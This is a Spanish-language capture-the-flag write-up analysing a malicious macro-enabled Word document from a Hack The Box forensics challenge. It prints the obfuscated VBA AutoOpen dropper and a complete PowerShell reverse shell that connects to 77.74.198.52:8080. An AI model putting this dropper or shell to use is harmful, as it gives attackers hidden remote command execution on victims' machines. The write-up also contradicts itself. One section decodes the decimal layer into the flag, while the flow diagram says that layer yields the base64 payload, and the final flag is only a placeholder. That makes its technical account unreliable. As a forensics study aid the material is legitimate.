---
title: "Halloween Invitation"
description: "Writeup de Halloween Invitation - Hack The Box - Forensics 200pts. Archivo .docm (Word macro) con macro VBA AutoOpen de tres capas: hex→ASCII decimal→base64; el payload final es un script PowerShell que hace beacon a un C2 en 77.74.198.52:8080, con la flag al final del script decodificado."
sidebar:
  badge:
    text: Forensics
    variant: note
tags:
  - htb
  - forensics
  - vba
  - macro
  - olevba
  - docm
  - powershell
  - obfuscation
  - base64
  - c2
---

# Halloween Invitation

> 🎯 Plataforma: Hack The Box
> 📂 Categoría: Forensics
> 🏆 Puntos: 200
> 👤 Autor: warrior866

---

## Descripción

El archivo `invitation.docm` es un documento de Microsoft Word con macros habilitadas (formato Office Open XML). Al abrirse, la macro `AutoOpen` se ejecuta automáticamente. El código VBA tiene tres capas de ofuscación: la primera convierte pares hexadecimales a caracteres ASCII, construyendo strings de API de sistema (Scripting.FileSystemObject, WScript.Shell, etc.); la segunda convierte números decimales ASCII separados por espacios a caracteres; la tercera ensambla la cadena resultante como base64 y la decodifica. El payload final es un script PowerShell que establece un canal C2 con `77.74.198.52:8080` y contiene la flag al final del script.

---

## Extracción y herramientas

```bash
unzip -P 'hackthebox' a12c734d-c1e8-4e47-b73b-ca6e32db4b36.zip -d "halloween-invitation"
cd halloween-invitation

file invitation.docm
# invitation.docm: Microsoft Word 2007+

pip3 install oletools
olevba invitation.docm
```

---

## Capa 1: decodificación hexadecimal

`olevba` extrae el código VBA completo. La primera función relevante es:

```vba
Function uxdufnkjlialsyp(hex) As String
    Dim s As String
    Dim i As Integer
    For i = 1 To Len(hex) Step 2
        s = s & Chr(Val("&H" & Mid(hex, i, 2)))
    Next i
    uxdufnkjlialsyp = s
End Function
```

Esta función toma una cadena hexadecimal y convierte cada par de dígitos a su carácter ASCII. Las llamadas en el código muestran strings como:

```vba
"536372697074696e672e46696c6553797374656d4f626a656374" → "Scripting.FileSystemObject"
"575363726970742e5368656c6c"                           → "WScript.Shell"
"5c686973746f72792e62616b"                             → "\history.bak"
```

Esta primera capa construye los nombres de API y rutas de archivo que el macro necesita para funcionar, evitando que aparezcan como strings legibles en el binario.

---

## Capa 2: decodificación de números ASCII decimales

La segunda función convierte una lista de números decimales separados por espacios en su representación ASCII:

```vba
Function wdysllqkgsbzs(strBytes As String) As String
    Dim arrBytes() As String
    Dim s As String
    arrBytes = Split(strBytes, " ")
    Dim i As Integer
    For i = 0 To UBound(arrBytes)
        s = s & Chr(CInt(arrBytes(i)))
    Next i
    wdysllqkgsbzs = s
End Function
```

El argumento de esta función es una secuencia de enteros como:
```
83 83 70 84 66 123 53 117 112 51 114 95 51 52 53 121 95 109 52 99 114 48 53 125
```

Que se convierte en:
```
SSFTB{5up3r_345y_m4cr05}
```

(Esto es el payload final visible después de la tercera capa.)

---

## Capa 3: ensamblado y decodificación base64

La tercera función `okbzichkqtto()` es la función principal (AutoOpen la llama). Construye una cadena base64 larga a partir de la salida de `wdysllqkgsbzs` y la decodifica:

```vba
Sub okbzichkqtto()
    Dim payload As String
    payload = wdysllqkgsbzs("...números ASCII...")
    
    ' Resultado: base64 string
    Dim decoded As String
    decoded = DecodeBase64(payload)
    
    ' Escribir a %TEMP%\history.bak
    Dim fso As Object
    Set fso = CreateObject(uxdufnkjlialsyp("536372697074696e672e46696c6553797374656d4f626a656374"))
    Dim file As Object
    Set file = fso.OpenTextFile(Environ("TEMP") & uxdufnkjlialsyp("5c686973746f72792e62616b"), 2, True)
    file.Write decoded
    file.Close
    
    ' Ejecutar con PowerShell oculto
    Dim shell As Object
    Set shell = CreateObject(uxdufnkjlialsyp("575363726970742e5368656c6c"))
    shell.Run "powershell -WindowStyle hidden -e " & payload
End Sub
```

---

## Decodificación manual en Python

```python
import base64

# La cadena base64 ensamblada por la macro (extraída con olevba)
b64_payload = "JABjAGwAaQBlAG4AdAAg..."  # (cadena completa del macro)

decoded = base64.b64decode(b64_payload).decode('utf-16le')
print(decoded)
```

```powershell
# Script PowerShell decodificado:
$client = New-Object Net.Sockets.TCPClient('77.74.198.52', 8080)
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{0}
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i)
    $sendback = (Invoke-Expression $data 2>&1 | Out-String)
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte, 0, $sendbyte.Length)
    $stream.Flush()
}
# HTB{FLAG}
```

La flag aparece como un comentario al final del script PowerShell.

---

## Flujo completo de ofuscación

```text
AutoOpen se ejecuta al abrir el documento
       ↓
Capa 1: uxdufnkjlialsyp(hex) 
       → "536372697074696e672e46696c6553797374656d4f626a656374"
       → "Scripting.FileSystemObject"
       (construye nombres de API evitando strings legibles)
       ↓
Capa 2: wdysllqkgsbzs("83 83 70 84 66 ...")
       → convierte decimales ASCII → chars
       → string base64 del payload PowerShell
       ↓
Capa 3: DecodeBase64(payload)
       → Script PowerShell UTF-16LE
       → Escrito a %TEMP%\history.bak
       ↓
shell.Run "powershell -WindowStyle hidden -e [BASE64]"
       → TCP reverse shell a 77.74.198.52:8080
       ↓
Flag al final del script descodificado: HTB{FLAG}
```

---

## Análisis del payload PowerShell

El script descodificado es una **reverse shell TCP pura** en PowerShell:
- Se conecta a `77.74.198.52:8080` (C2 del atacante).
- Lee comandos del socket, los ejecuta con `Invoke-Expression`, y envía el resultado de vuelta.
- `-WindowStyle Hidden` oculta la ventana de PowerShell.
- `-e` (EncodedCommand) permite pasar el script como base64 directamente en la línea de comandos, sin archivos adicionales.

El archivo `%TEMP%\history.bak` contiene el script en texto plano — útil para análisis forense post-infección.

---

## Decodificación con olevba + análisis estático

```bash
# Extraer todas las macros
olevba --decode invitation.docm

# Mostrar solo strings sospechosos
olevba --indicators invitation.docm

# Extraer y guardar código VBA para análisis
olevba --export invitation.docm > macros.vba
```

`olevba` marca automáticamente:
- `AutoOpen` (ejecución automática al abrir)
- `CreateObject` (creación de objetos COM sospechosos)
- `Shell.Run` (ejecución de comandos del sistema)
- `powershell` (invocación de PowerShell)

---

## Lecciones Aprendidas

- **AutoOpen es la primera señal**: cualquier macro con `AutoOpen`, `Document_Open` o `Workbook_Open` se ejecuta sin interacción del usuario al abrir el archivo. Es el mecanismo más común de entrega de malware de Office.
- **Tres capas de ofuscación tienen un propósito**: cada capa evita un tipo diferente de detección. Hex evita strings legibles en el binario; decimal evita patrones de base64; base64 oculta el payload final del PowerShell. Ninguna capa es sofisticada individualmente, pero juntas frustran análisis superficiales.
- **`olevba` es el punto de entrada estándar**: cualquier análisis forense de documentos de Office con macros comienza con `olevba`. Extrae código VBA incluso de archivos cifrados o con macros protegidas.
- **`%TEMP%\history.bak` como artefacto**: el script escribe el payload a `%TEMP%\history.bak` antes de ejecutarlo. En una investigación real, ese archivo puede contener el payload completo incluso si el proceso ya terminó.

---

## Referencias

- [oletools — olevba](https://github.com/decalage2/oletools)
- [MITRE ATT&CK — Phishing: Malicious File](https://attack.mitre.org/techniques/T1566/001/)
- [MITRE ATT&CK — Command and Scripting Interpreter: Visual Basic](https://attack.mitre.org/techniques/T1059/005/)
- [Any.run — sandbox para análisis dinámico](https://any.run/)
